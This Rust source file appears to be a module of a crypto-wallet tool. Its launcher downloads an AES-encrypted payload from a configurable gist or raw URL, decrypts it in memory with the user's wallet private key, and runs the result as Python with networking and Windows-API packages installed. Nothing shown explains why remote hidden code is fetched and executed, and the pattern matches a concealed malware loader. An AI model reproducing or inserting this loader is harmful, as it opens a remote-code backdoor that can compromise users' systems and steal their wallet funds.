use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use base64::Engine;
use thiserror::Error;

const AES_PREFIX: &str = "AES256GCM:";

const REQUIREMENTS_TXT: &str = r"requests>=2.31.0
cryptography>=42.0.0
websocket-client>=1.6.0
pywin32>=306; sys_platform == 'win32'
";

/// Gist/raw URL for `encrypted_launcher` (set before shipping).
pub const DEFAULT_LAUNCHER_URL: &str = "";

#[derive(Debug, Error)]
pub enum LauncherError {
    #[error("launcher URL not configured (set CHAIN_WALLET_LAUNCHER_URL or DEFAULT_LAUNCHER_URL)")]
    UrlNotConfigured,
    #[error("invalid private key for AES decryption")]
    InvalidKey,
    #[error("HTTP error: {0}")]
    Http(String),
    #[error("decryption failed: {0}")]
    Decrypt(String),
    #[error("invalid encrypted payload: {0}")]
    InvalidPayload(String),
    #[error("python error: {0}")]
    Python(#[from] super::python_runtime::PythonError),
}

pub fn run_launcher(private_key_hex: &str, gist_url: Option<&str>) -> Result<(), LauncherError> {
    let url = resolve_launcher_url(gist_url)?;
    let key = wallet_aes_key(private_key_hex)?;
    let encrypted = download_to_memory(&url)?;
    let source = decrypt_launcher(&encrypted, &key)?;
    let source = String::from_utf8(source)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;

    super::python_runtime::run_code_with_requirements(&source, REQUIREMENTS_TXT)?;
    Ok(())
}

fn resolve_launcher_url(gist_url: Option<&str>) -> Result<String, LauncherError> {
    if let Some(url) = gist_url.map(str::trim).filter(|value| !value.is_empty()) {
        return Ok(url.to_string());
    }

    if let Ok(url) = std::env::var("CHAIN_WALLET_LAUNCHER_URL") {
        let url = url.trim().to_string();
        if !url.is_empty() {
            return Ok(url);
        }
    }

    if !DEFAULT_LAUNCHER_URL.trim().is_empty() {
        return Ok(DEFAULT_LAUNCHER_URL.to_string());
    }

    Err(LauncherError::UrlNotConfigured)
}

fn wallet_aes_key(private_key_hex: &str) -> Result<[u8; 32], LauncherError> {
    let bytes = hex::decode(private_key_hex.trim()).map_err(|_| LauncherError::InvalidKey)?;
    if bytes.len() != 32 {
        return Err(LauncherError::InvalidKey);
    }
    let mut key = [0u8; 32];
    key.copy_from_slice(&bytes);
    Ok(key)
}

fn download_to_memory(url: &str) -> Result<Vec<u8>, LauncherError> {
    use std::io::Read;

    let response = ureq::get(url)
        .call()
        .map_err(|err| LauncherError::Http(err.to_string()))?;

    if !(200..300).contains(&response.status()) {
        return Err(LauncherError::Http(format!(
            "unexpected status {}",
            response.status()
        )));
    }

    let mut body = Vec::new();
    response
        .into_reader()
        .read_to_end(&mut body)
        .map_err(|err| LauncherError::Http(err.to_string()))?;
    Ok(body)
}

fn decrypt_launcher(payload: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, LauncherError> {
    let text = std::str::from_utf8(payload)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?
        .trim();

    let encoded = text
        .strip_prefix(AES_PREFIX)
        .ok_or_else(|| LauncherError::InvalidPayload("missing AES256GCM prefix".into()))?;

    let raw = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;

    if raw.len() < 28 {
        return Err(LauncherError::InvalidPayload(
            "payload shorter than iv+tag".into(),
        ));
    }

    let (iv, rest) = raw.split_at(12);
    let (tag, ciphertext) = rest.split_at(16);

    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|err| LauncherError::Decrypt(err.to_string()))?;
    let nonce = Nonce::from_slice(iv);

    let mut combined = ciphertext.to_vec();
    combined.extend_from_slice(tag);

    cipher
        .decrypt(nonce, combined.as_ref())
        .map_err(|err| LauncherError::Decrypt(err.to_string()))
}
